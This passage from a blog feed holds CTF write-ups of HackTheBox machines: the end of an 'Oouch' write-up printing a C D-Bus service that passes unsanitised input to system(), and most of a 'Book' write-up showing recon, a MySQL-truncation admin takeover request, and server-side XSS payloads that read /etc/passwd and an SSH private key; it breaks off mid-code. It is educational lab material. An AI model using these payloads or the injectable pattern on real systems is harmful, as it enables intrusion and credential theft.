class="line"></span><br><span class="line">  http://0pointer.net/blog/the-new-sd-bus-api-of-systemd.html</span><br><span class="line">  https://django-oauth-toolkit.readthedocs.io/en/latest/</span><br><span class="line">  https://blog.miguelgrinberg.com/post/the-flask-mega-tutorial-part-i-hello-world</span><br><span class="line"></span><br><span class="line">Big thanks to all, who share their knowledge with other people!</span><br></pre></td></tr></table></figure><p>Couldn’t agree more!</p><p>We can also find the source code of the app simulating admin opening link sent through contact page, creating the SSRF. We also find the <code>dbus</code> server source code which is worth reading to understand how our command is handled once a message is sent on the <code>htb.oouch.Block</code> Interface.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;systemd/sd-bus.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">method_block</span><span class="params">(sd_bus_message *m, <span class="keyword">void</span> *userdata, sd_bus_error *ret_error)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>* host = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Read the parameters */</span></span><br><span class="line">        r = sd_bus_message_read(m, <span class="string">&quot;s&quot;</span>, &amp;host);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to obtain hostname: %s\n&quot;</span>, strerror(-r));</span><br><span class="line">                <span class="keyword">return</span> r;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> command[] = <span class="string">&quot;iptables -A PREROUTING -s %s -t mangle -j DROP&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> command_len = <span class="built_in">strlen</span>(command);</span><br><span class="line">        <span class="keyword">int</span> host_len = <span class="built_in">strlen</span>(host);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>* command_buffer = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((host_len + command_len) * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        <span class="keyword">if</span>(command_buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to allocate memory\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sprintf</span>(command_buffer, command, host);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* In the first implementation, we simply ran command using system(), since the expected DBus</span></span><br><span class="line"><span class="comment">         * to be threading automatically. However, DBus does not thread and the application will hang</span></span><br><span class="line"><span class="comment">         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real</span></span><br><span class="line"><span class="comment">         * multithreading)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">int</span> pid = fork();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( pid == <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="comment">/* Here we are in the child process. We execute the command and eventually exit. */</span></span><br><span class="line">            system(command_buffer);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* Here we are in the parent process or an error occured. We simply send a genric message.</span></span><br><span class="line"><span class="comment">             * In the first implementation we returned separate error messages for success or failure.</span></span><br><span class="line"><span class="comment">             * However, now we cannot wait for results of the system call. Therefore we simply return</span></span><br><span class="line"><span class="comment">             * a generic. */</span></span><br><span class="line">            <span class="keyword">return</span> sd_bus_reply_method_return(m, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;Carried out :D&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r = system(command_buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The vtable of our little object, implements the net.poettering.Calculator interface */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> sd_bus_vtable block_vtable[] = &#123;</span><br><span class="line">        SD_BUS_VTABLE_START(<span class="number">0</span>),</span><br><span class="line">        SD_BUS_METHOD(<span class="string">&quot;Block&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;s&quot;</span>, method_block, SD_BUS_VTABLE_UNPRIVILEGED),</span><br><span class="line">        SD_BUS_VTABLE_END</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Main method, registeres the htb.oouch.Block service on the system dbus.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Paramaters:</span></span><br><span class="line"><span class="comment">         *      argc            (int)             Number of arguments, not required</span></span><br><span class="line"><span class="comment">         *      argv[]          (char**)          Argument array, not required</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Returns:</span></span><br><span class="line"><span class="comment">         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive</span></span><br><span class="line"><span class="comment">         *      as long as the user keeps it alive.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */</span></span><br><span class="line">        signal(SIGCHLD,SIG_IGN);</span><br><span class="line"></span><br><span class="line">        sd_bus_slot *slot = <span class="literal">NULL</span>;</span><br><span class="line">        sd_bus *bus = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* First we need to connect to the system bus. */</span></span><br><span class="line">        r = sd_bus_open_system(&amp;bus);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to connect to system bus: %s\n&quot;</span>, strerror(-r));</span><br><span class="line">                <span class="keyword">goto</span> finish;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Install the object */</span></span><br><span class="line">        r = sd_bus_add_object_vtable(bus,</span><br><span class="line">                                     &amp;slot,</span><br><span class="line">                                     <span class="string">&quot;/htb/oouch/Block&quot;</span>,  <span class="comment">/* object path */</span></span><br><span class="line">                                     <span class="string">&quot;htb.oouch.Block&quot;</span>,   <span class="comment">/* interface name */</span></span><br><span class="line">                                     block_vtable,</span><br><span class="line">                                     <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to install htb.oouch.Block: %s\n&quot;</span>, strerror(-r));</span><br><span class="line">                <span class="keyword">goto</span> finish;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Register the service name to find out object */</span></span><br><span class="line">        r = sd_bus_request_name(bus, <span class="string">&quot;htb.oouch.Block&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to acquire service name: %s\n&quot;</span>, strerror(-r));</span><br><span class="line">                <span class="keyword">goto</span> finish;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Infinite loop to process the client requests */</span></span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="comment">/* Process requests */</span></span><br><span class="line">                r = sd_bus_process(bus, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to process bus: %s\n&quot;</span>, strerror(-r));</span><br><span class="line">                        <span class="keyword">goto</span> finish;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (r &gt; <span class="number">0</span>) <span class="comment">/* we processed a request, try to process another one, right-away */</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Wait for the next request to process */</span></span><br><span class="line">                r = sd_bus_wait(bus, (<span class="keyword">uint64_t</span>) <span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to wait on bus: %s\n&quot;</span>, strerror(-r));</span><br><span class="line">                        <span class="keyword">goto</span> finish;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">finish:</span><br><span class="line">        sd_bus_slot_unref(slot);</span><br><span class="line">        sd_bus_unref(bus);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> r &lt; <span class="number">0</span> ? EXIT_FAILURE : EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Hard Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> docker </tag>
            
            <tag> exploit </tag>
            
            <tag> Oouch </tag>
            
            <tag> oauth </tag>
            
            <tag> oauth2 </tag>
            
            <tag> SSRF </tag>
            
            <tag> uwsgi </tag>
            
            <tag> dbus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Book</title>
      <link href="/posts/book/"/>
      <url>/posts/book/</url>
      
        <content type="html"><![CDATA[<img width="584" alt="book-hackthebox" src="https://user-images.githubusercontent.com/9076747/82153957-fc980d00-986a-11ea-8d28-e035b1c20bd7.png"><p>Book just retired on Hackthebox. It was made by MrR3boot, one of my favorite box maker.<br>This box didn’t break the rule and was really well designed. While rated Medium difficulty, the foothold and user gave me more trouble than some Hard rated box. For once you have to think way more in real life scenarios than in CTF-like style. Still super interesting and I recommend it if you are comfortable with medium and hard boxes. Place to the write-up now!</p><p><strong>Tl;Dr:</strong> The user flag required you to exploit two parts of the “Book” website. First you had to exploit a MySQL truncation misconfiguration to login as <code>admin</code> to the admin panel. Then you login as normal user to the user interface of the website. From there you exploit a local file read vulnerability via XSS in a dynamically generated PDF visible from the admin interface you accessed earlier. Using this vulnerability you can access the user <code>reader</code> SSH key and use it to grab the flag.<br>The root part consisted in exploited a vulnerability (CVE-2019-10143) in the <code>logrotate</code> utility running allowing running arbitrary binary as <code>root</code>.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.176 book.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC book.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 18:33 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> book.htb (10.10.10.176)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: LIBRARY - Read | Learn | Have Fun</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 80 and the SSH port 22 open.</p><p>Opening <code>http://book.htb</code> display a following page:</p><p><img src="https://user-images.githubusercontent.com/9076747/80860341-5394c400-8c67-11ea-9f66-9a54fbc04fca.png" alt="book homepage"></p><p>We have a sign-up/login form. Before anything else let’s run <code>gobuster</code> to see if we can find anything else valuable:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://book.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/admin (Status: 301)</span><br><span class="line">/books.php (Status: 302)</span><br><span class="line">/collections.php (Status: 302)</span><br><span class="line">/contact.php (Status: 302)</span><br><span class="line">/db.php (Status: 200)</span><br><span class="line">/docs (Status: 301)</span><br><span class="line">/download.php (Status: 302)</span><br><span class="line">/feedback.php (Status: 302)</span><br><span class="line">/home.php (Status: 302)</span><br><span class="line">/images (Status: 301)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/logout.php (Status: 302)</span><br><span class="line">/profile.php (Status: 302)</span><br><span class="line">/search.php (Status: 302)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/settings.php (Status: 302)</span><br></pre></td></tr></table></figure><p>We do have plenty of pages, once login we will be able to check all of them in more details. First thing that catch the eye is the <code>/admin</code> endpoint. Opening it display almost the exact same login page, expect that it’s only possible to login:</p><p><img src="https://user-images.githubusercontent.com/9076747/80860443-e897bd00-8c67-11ea-9587-801bdea248e4.png" alt="book admin login page"></p><p>Since we don’t have enough information to try anything on this admin page let’s go back to the normal login form.</p><p>From here let’s create a user account and use it to login. Once done we get welcomed to the following panel:</p><p><img src="https://user-images.githubusercontent.com/9076747/80860516-50e69e80-8c68-11ea-9d28-00859a500315.png" alt="book user panel"></p><p>From here we can see we have access to most pages that were returned by <code>gobuster</code>. </p><p>The most interesting part seems to be the <code>/collections</code> one where it’s possible to upload your own books: </p><p><img src="https://user-images.githubusercontent.com/9076747/80860606-15000900-8c69-11ea-8fc8-26788310a4fe.png" alt="book collections upload"></p><p>When facing a file upload form it’s always good to try uploading a web shell right ? Unfortunately, no matter what is being uploaded, the form returns the following message:</p><blockquote><p>Thanks for the submission. We will evaluate and update the list</p></blockquote><p>The problem here is that we have no confirmations if the file got uploaded successfully and no idea where it got uploaded. Yet we notice the “<em>We will evaluate and update the list</em>“. This probably means that from the admin panel we found early it should be possible to see the “pending” upload ? Let’s keep the that in mind.</p><p>Our next step here is to find a way to enter the admin panel to see if we can get access to additional informations and maybe to the uploaded files in any way. </p><p>While looking around we stumble across another useful piece of informations in the <code>/contact.php</code> page:</p><p><img src="https://user-images.githubusercontent.com/9076747/80860905-424db680-8c6b-11ea-8998-d69b33f77bfc.png" alt="book contact page"></p><p>We now know the admin email is <code>admin@book.htb</code> (even though we could have guessed it). We only need to find its password now. Brute-forcing is never the way to go on web app and will just risk to break the box for other users so let’s find another method.</p><p>In the same idea of the <a href="https://hg8.sh/posts/forwardslash/">ForwardSlash</a> box maybe we can Sign up using <code>admin@book.htb</code> as email and get the account password overwritten ? Unfortunately trying so simply returns the following error message:</p><blockquote><p>User Exits!</p></blockquote><p>To be honest I got a bit short on ideas at this point until I noticed something interesting in my user account. We have the possibility to edit our username, but it gets truncated after 10 chars:</p><p><img src="https://user-images.githubusercontent.com/9076747/80861186-2c40f580-8c6d-11ea-8b57-23051569c034.png" alt="book username"></p><p>Changing my username to <code>abcdefghijqlmnopqrstuv</code> will return as follow:</p><blockquote><p>Signed in as abcdefghij</p></blockquote><p>Spaces seems to be removed aswell, so changing my username to <code>hg8       a</code> returns:</p><blockquote><p>Signed in as hg8</p></blockquote><p>This made us wonder if the same happen on account creation ? What would happen if we try to create an account with <code>admin@book.htb··············a</code> as email (<code>·</code> being a space) ? Maybe you could overwrite the admin password this way ?</p><h3 id="Abusing-MySQL-truncation"><a href="#Abusing-MySQL-truncation" class="headerlink" title="Abusing MySQL truncation"></a>Abusing MySQL truncation</h3><p>Let’s go to back to the Sign Up form and launch the following request:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&#x27;http://book.htb/&#x27;</span> -i \</span><br><span class="line">-d <span class="string">&#x27;name=admin&amp;email=admin@book.htb            a&amp;password=hg8.sh&#x27;</span></span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Set-Cookie: PHPSESSID=nxxxxxxxxxxxxxxxxx; path=/</span><br><span class="line">location: index.php</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><p><code>302 Found</code> and a redirect to <code>index.php</code>. Looks like we are on the right tracks! Let’s now try to login using those credentials and bingo!</p><p><img src="https://user-images.githubusercontent.com/9076747/80861578-bb4f0d00-8c6f-11ea-887e-79a8bcfaba61.png" alt="book admin panel"></p><p>From there we have access to various moderation tools. We do have access to the <code>Collections</code> part we were looking at in the user panel:</p><p><img src="https://user-images.githubusercontent.com/9076747/80861655-37e1eb80-8c70-11ea-8b7c-182b06ce491f.png" alt="book admin panel collections"></p><p>On this page it is possible to download a PDF of the users list and the book collections. The PDF content is a simple table and available through a random filename: </p><p><img src="https://user-images.githubusercontent.com/9076747/80864658-65d12b00-8c84-11ea-8d27-93284b3cf9aa.png" alt="book admin panel pdf"></p><p>At first look this table looks like a simple HTML table converted to PDF. Here is the HTML Table <a href="https://www.w3schools.com/html/html_tables.asp">example available at W3School</a>:</p><p><img src="https://user-images.githubusercontent.com/9076747/80861763-d1a99880-8c70-11ea-8257-892b4ea29d51.png" alt="w3school html table"></p><p>This puts us on the right tracks, the PDF is very probably dynamically generated from a page of this admin panel with a tool like <a href="https://phantomjs.org/">PhantomJS</a> or so… Let’s dig into this idea.</p><h3 id="XSS-in-Dynamic-PDF-Generation"><a href="#XSS-in-Dynamic-PDF-Generation" class="headerlink" title="XSS in Dynamic PDF Generation"></a>XSS in Dynamic PDF Generation</h3><p>So our starting point is a guess that the <code>collections</code> PDF is generated from an HTML page. Knowing we can control some of the values that end end in the PDF (using the user panel) maybe we can inject something in the final PDF ?</p><p>First let’s try to inject HTML to see if we can validate our idea. Going back to the user panel let’s enter HTLM tag in the <code>author</code> field:</p><p><img src="https://user-images.githubusercontent.com/9076747/80864134-fb6abb80-8c80-11ea-87f5-0539a3a5937c.png" alt="book html tag injection"></p><p>Let’s send it and go back to the admin panel to generate the <code>collections</code> PDF:</p><p><img src="https://user-images.githubusercontent.com/9076747/80864170-45ec3800-8c81-11ea-9be1-d9610a5ece6f.png" alt="book pdf html tag injection"></p><p>It worked, we are definitely on the right track. Since we can inject HTLM, can we inject Javascript aswell ? Let’s give it a try:</p><p><img src="https://user-images.githubusercontent.com/9076747/80864528-864cb580-8c83-11ea-874b-ec81a50ded49.png" alt="book XSS collections"></p><p>Going back to the admin panel we can find our PDF have been fully replaced with our “Test” string:</p><p><img src="https://user-images.githubusercontent.com/9076747/80864635-36222300-8c84-11ea-8052-f7d82d613722.png" alt="book collections XSS"></p><p>We just have confirmed our ability to XSS on server side. The first application that comes to mind with this vulnerability is local file read using javascript. Let’s start with the classical <code>/etc/passwd</code>.</p><p>We can come up with the following payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  a = <span class="keyword">new</span> XMLHttpRequest;</span><br><span class="line">  a.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="built_in">document</span>.write(<span class="built_in">this</span>.responseText)</span><br><span class="line">  &#125;;</span><br><span class="line">  a.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;file:///etc/passwd&quot;</span>);</span><br><span class="line">  a.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>First the payload will open the local file <code>/etc/passwd</code> then write its content to the document root. Let’s send it on the user panel and observe the results on admin panel generated PDF:</p><p><img src="https://user-images.githubusercontent.com/9076747/80864841-b1380900-8c85-11ea-89b2-cd55dba6531c.png" alt="book local file read"></p><p>Neat, thanks to file informations we know the user we are after: <code>reader</code>. </p><p>If we are lucky enough maybe we can use the local file read vulnerability to access <code>reader</code> SSH key. We should be able to do so using the following payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  a = <span class="keyword">new</span> XMLHttpRequest;</span><br><span class="line">  a.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="built_in">this</span>.responseText)</span><br><span class="line">  &#125;;</span><br><span class="line">  a.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;file:///home/reader/.ssh/id_rsa&quot;</span>);</span><br><span class="line">  a.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>Again let’s send this payload and access the generated PDF:</p><p><img src="https://user-images.githubusercontent.com/9076747/80865051-07597c00-8c87-11ea-90b5-0d889d323d29.png" alt="book local file inclusion id_rsa"></p><p>Using this key we can connect to <code>reader</code> and grab the user flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa reader@book.htb</span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Wed Jan 29 13:03:06 2020 from 10.10.14.3</span><br><span class="line">reader@book:~$ ls</span><br><span class="line">backups user.txt</span><br><span class="line">reader@book:~$ cat user.txt</span><br><span class="line">5xxxxxxxxxxxxxxxxxxxxxxxxxxc</span><br></pre></td></tr></table></figure><h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Looking around we quickly notice an usual folder in the <code>reader</code> home directory:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reader@book:~$ ls</span><br><span class="line">backups user.txt</span><br><span class="line">reader@book:~$ ls -l backups/</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 reader reader  0 Jan 29 13:05 access.log</span><br><span class="line">-rw-r--r-- 1 reader reader 91 Jan 29 13:05 access.log.1</span><br></pre></td></tr></table></figure><p>These two files are Apache access logs. It’s usually found in <code>/var/log/apache2/</code> directory. Seems like some task is backing up those access log files in <code>reader</code> home directory. </p><p>Before searching further, let’s focus on this unusual backup task. As every unusual items on a box it’s often the way to privilege escalation. </p><p>To do so let’s explore running processes to see if we can find anything related to Apache access log. For monitoring processes I always use <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a> which is a really great tool and helps a lot during CTF:</p><p>First let’s download and push <code>pspy</code> to the server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64</span><br><span class="line">[hg8@archbook ~]$ scp -i id_rsa ~/tools/pspy64 reader@book.htb:/tmp/.hg8</span><br><span class="line">pspy64                                                          100% 3006KB  96.7KB/s   00:31</span><br></pre></td></tr></table></figure><p>Then we can run <code>pspy</code> and quickly enough a interesting process popup: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 